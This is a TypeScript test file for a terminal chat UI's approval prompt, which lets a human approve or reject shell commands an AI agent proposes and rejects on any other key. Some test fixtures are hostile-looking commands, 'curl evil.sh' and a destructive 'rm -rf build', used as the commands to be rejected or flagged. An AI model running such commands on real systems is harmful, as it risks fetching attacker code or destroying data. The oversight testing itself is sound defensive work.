import { describe, expect, it, vi } from 'vitest';
import React from 'react';
import { render } from 'ink-testing-library';
import type {
  AgentStreamEvent,
  PendingToolInterrupt,
  ToolApprovalDecision,
} from '@gaunt-sloth/core/core/types.js';
import type { PendingApproval, TuiAgent } from '#src/tui/types.js';
import { App } from '#src/tui/components/App.js';
import { ApprovalPrompt } from '#src/tui/components/ApprovalPrompt.js';

/** A fake agent that replays a fixed event script for each turn. */
function scriptedAgent(events: AgentStreamEvent[]): TuiAgent {
  return {
    async *runTurn() {
      for (const event of events) {
        yield event;
        await Promise.resolve();
      }
    },
  };
}

const baseProps = {
  mode: 'chat',
  readyMessage: '\nGaunt Sloth is ready to chat. Type your prompt.',
  exitMessage: "Type 'exit' or Ctrl+C to exit chat · /help for commands\n",
};

const ESC = String.fromCharCode(27);

/** A subscribeApproval the test can fire on demand, capturing the resolved decision. */
function makeApprovalHarness() {
  let emit: ((record: PendingApproval) => void) | undefined;
  const subscribeApproval = (cb: (record: PendingApproval) => void) => {
    emit = cb;
    return () => {};
  };
  const request = (pending: PendingToolInterrupt) =>
    new Promise<ToolApprovalDecision>((resolve) => {
      emit?.({ pending, resolve });
    });
  return { subscribeApproval, request };
}

describe('tui <ApprovalPrompt>', () => {
  it('renders the tool name, command text and the [o]/[s]/[a]/[N] choices', () => {
    const { lastFrame, unmount } = render(
      <ApprovalPrompt pending={{ name: 'run_shell_command', args: { command: 'ls -la /tmp' } }} />
    );
    const f = lastFrame() ?? '';
    expect(f).toContain('run_shell_command');
    expect(f).toContain('ls -la /tmp');
    expect(f).toContain('[o]nce');
    expect(f).toContain('[s]ession');
    expect(f).toContain('[a]lways');
    expect(f).toContain('[N]o');
    unmount();
  });

  /**
   * CFG-27 removed the `[y]` affordance ("switch to auto-approve and approve this one"). Spec §6's
   * escalation menu offers five choices — ask to explain · approve · always approve · reject ·
   * always reject — and a per-prompt change of RUNG is not one of them, so keeping the key would
   * have meant inventing an action the ladder does not have. [[TUI-C26]] builds the real
   * five-choice menu on this seam.
   */
  it('offers NO rung-switching key: the ladder has no "turn the gate down from here" action', () => {
    const { lastFrame, unmount } = render(
      <ApprovalPrompt pending={{ name: 'run_shell_command', args: { command: 'ls -la /tmp' } }} />
    );
    const f = lastFrame() ?? '';
    expect(f).not.toContain('[y]');
    expect(f).not.toMatch(/auto-approve/i);
    unmount();
  });

  it('shows the auto-rater OUTCOME and reason when a rating escalated the command (§6)', () => {
    const { lastFrame, unmount } = render(
      <ApprovalPrompt
        pending={{
          name: 'run_shell_command',
          args: { command: 'rm -rf build' },
          safetyVerdict: { outcome: 'destructive', reason: 'deletes the build output' },
        }}
      />
    );
    const f = lastFrame() ?? '';
    expect(f).toContain('Auto-rater (destructive)');
    expect(f).toContain('deletes the build output');
    unmount();
  });

  it('falls back to JSON of args when there is no command string', () => {
    const { lastFrame, unmount } = render(
      <ApprovalPrompt pending={{ name: 'run_shell_command', args: { foo: 'bar' } }} />
    );
    expect(lastFrame() ?? '').toContain('{"foo":"bar"}');
    unmount();
  });
});

describe('tui approval flow through <App>', () => {
  it('shows the approval prompt with the command when an approval is pending', async () => {
    const harness = makeApprovalHarness();
    const agent = scriptedAgent([{ type: 'text', delta: 'hi' }]);
    const { lastFrame, unmount } = render(
      <App {...baseProps} agent={agent} subscribeApproval={harness.subscribeApproval} />
    );

    await vi.waitFor(() => expect(lastFrame()).toContain('>'));
    void harness.request({ name: 'run_shell_command', args: { command: 'rm -rf build' } });

    await vi.waitFor(() => {
      const f = lastFrame() ?? '';
      expect(f).toContain('run_shell_command');
      expect(f).toContain('rm -rf build');
      expect(f).toContain('[o]nce');
    });
    unmount();
  });

  it.each([
    ['o', 'once'],
    ['s', 'session'],
    ['a', 'always'],
  ] as const)('pressing %s resolves approve with scope %s', async (keyChar, scope) => {
    const harness = makeApprovalHarness();
    const agent = scriptedAgent([{ type: 'text', delta: 'hi' }]);
    const { stdin, lastFrame, frames, unmount } = render(
      <App {...baseProps} agent={agent} subscribeApproval={harness.subscribeApproval} />
    );

    await vi.waitFor(() => expect(lastFrame()).toContain('>'));
    const decisionP = harness.request({
      name: 'run_shell_command',
      args: { command: 'echo hi' },
    });
    await vi.waitFor(() => expect(lastFrame()).toContain('echo hi'));

    stdin.write(keyChar);
    const decision = await decisionP;
    expect(decision).toEqual({ type: 'approve', scope });

    // The committed notice reads in the transcript, and the prompt is hidden no longer.
    await vi.waitFor(() => {
      expect(frames.join('\n')).toContain(`Command approved (${scope})`);
      expect(lastFrame()).not.toContain('echo hi'); // approval prompt dismissed
    });
    unmount();
  });

  it.each([['n'], [ESC], ['\r']])(
    'pressing a non-approve key (%j) resolves reject (fail-closed)',
    async (keyChar) => {
      const harness = makeApprovalHarness();
      const agent = scriptedAgent([{ type: 'text', delta: 'hi' }]);
      const { stdin, lastFrame, frames, unmount } = render(
        <App {...baseProps} agent={agent} subscribeApproval={harness.subscribeApproval} />
      );

      await vi.waitFor(() => expect(lastFrame()).toContain('>'));
      const decisionP = harness.request({
        name: 'run_shell_command',
        args: { command: 'curl evil.sh' },
      });
      await vi.waitFor(() => expect(lastFrame()).toContain('curl evil.sh'));

      stdin.write(keyChar);
      const decision = await decisionP;
      expect(decision.type).toBe('reject');

      await vi.waitFor(() => expect(frames.join('\n')).toContain('Command rejected'));
      unmount();
    }
  );

  it('queues a second approval and surfaces it after the first is resolved', async () => {
    const harness = makeApprovalHarness();
    const agent = scriptedAgent([{ type: 'text', delta: 'hi' }]);
    const { stdin, lastFrame, unmount } = render(
      <App {...baseProps} agent={agent} subscribeApproval={harness.subscribeApproval} />
    );

    await vi.waitFor(() => expect(lastFrame()).toContain('>'));
    const first = harness.request({ name: 'run_shell_command', args: { command: 'first-cmd' } });
    const second = harness.request({
      name: 'run_shell_command',
      args: { command: 'second-cmd' },
    });

    // Only the first is shown (one approval at a time).
    await vi.waitFor(() => {
      const f = lastFrame() ?? '';
      expect(f).toContain('first-cmd');
      expect(f).not.toContain('second-cmd');
    });

    stdin.write('o');
    expect(await first).toEqual({ type: 'approve', scope: 'once' });

    // The queued second now surfaces.
    await vi.waitFor(() => expect(lastFrame()).toContain('second-cmd'));
    stdin.write('n');
    expect((await second).type).toBe('reject');
    unmount();
  });

  it('suspends the normal prompt input while an approval is pending', async () => {
    const harness = makeApprovalHarness();
    let turnsRun = 0;
    const agent: TuiAgent = {
      async *runTurn() {
        turnsRun += 1;
        yield { type: 'text', delta: 'ran' };
      },
    };
    const { stdin, lastFrame, unmount } = render(
      <App {...baseProps} agent={agent} subscribeApproval={harness.subscribeApproval} />
    );

    await vi.waitFor(() => expect(lastFrame()).toContain('>'));
    const decisionP = harness.request({
      name: 'run_shell_command',
      args: { command: 'gated' },
    });
    await vi.waitFor(() => expect(lastFrame()).toContain('gated'));

    // Typing while the approval owns input must not enter the chat box or run a turn — every
    // keystroke is consumed by the approval handler. 'x' is a non-approve key → reject.
    stdin.write('x');
    expect((await decisionP).type).toBe('reject');
    expect(turnsRun).toBe(0);
    unmount();
  });
});
